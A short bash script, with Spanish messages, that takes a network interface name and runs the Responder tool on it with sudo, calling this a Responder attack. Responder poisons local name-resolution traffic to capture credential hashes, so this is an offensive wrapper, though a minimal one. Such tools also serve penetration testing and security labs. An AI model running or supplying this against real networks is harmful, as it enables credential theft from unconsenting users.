#!/bin/bash

if [ -z "$1" ]; then
    echo "Uso: $0 <interface>"
    exit 1
fi

INTERFACE=$1

echo "Iniciando ataque Responder en la interfaz $INTERFACE"
sudo responder -I $INTERFACE

echo "Ataque Responder completado."
